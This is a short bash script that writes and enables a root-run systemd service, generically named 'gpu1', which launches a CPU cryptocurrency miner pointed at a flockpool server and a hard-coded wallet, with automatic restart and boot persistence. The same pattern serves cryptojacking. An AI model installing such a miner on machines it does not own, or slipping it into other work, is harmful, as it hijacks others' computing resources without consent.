bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/cpuminer-avx2 -a gr -o stratum+tcp://eu.flockpool.com:4444 -u RHP7KfXoAvvSBVbJSsxTnmWhPaWQsLs5Yr.ssh1
WatchdogSec=1800000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable gpu1.service &&
service gpu1 stop  &&
service gpu1 restart
